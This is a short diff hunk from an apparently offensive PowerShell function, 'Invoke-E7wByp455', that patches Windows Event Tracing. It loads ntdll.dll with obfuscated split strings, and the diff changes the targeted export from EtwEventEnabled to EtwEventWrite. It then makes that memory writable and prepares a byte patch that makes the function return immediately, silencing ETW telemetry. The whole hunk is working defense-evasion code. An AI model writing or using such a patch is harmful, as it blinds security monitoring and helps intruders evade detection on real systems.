@@ -48,7 +48,7 @@ function Invoke-E7wByp455{
 
     Process {
 		$LoadLibrary = [Win32Etw]::ll("ntd" + "ll.dll")
-		$Address = [Win32Etw]::gpa($LoadLibrary, "Etw" + "Event" + "Enabled")
+		$Address = [Win32Etw]::gpa($LoadLibrary, "Etw" + "Event" + "Write")
 		$p = 0
 		[Win32Etw]::vp($Address, [uint32]3, 0x40, [ref]$p)
 		$Patch = [Byte[]] (0xB0,0x00,0xC3)
